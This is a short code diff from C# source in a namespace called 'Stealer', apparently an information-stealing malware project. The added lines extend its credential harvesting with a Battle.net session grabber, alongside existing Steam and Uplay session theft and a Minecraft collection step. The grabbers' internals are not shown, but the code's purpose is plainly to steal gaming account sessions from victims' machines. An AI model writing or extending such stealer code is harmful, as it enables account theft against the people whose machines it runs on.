@@ -70,6 +70,8 @@ namespace Stealer
                     Steam.GetSteamSession(sSavePath + "\\Gaming\\Steam");
                     // Write uplay session
                     Uplay.GetUplaySession(sSavePath + "\\Gaming\\Uplay");
+                    // Write battle net session
+                    BattleNET.GetBattleNETSession(sSavePath + "\\Gaming\\BattleNET");
                 }));
 
                 // Minecraft collection
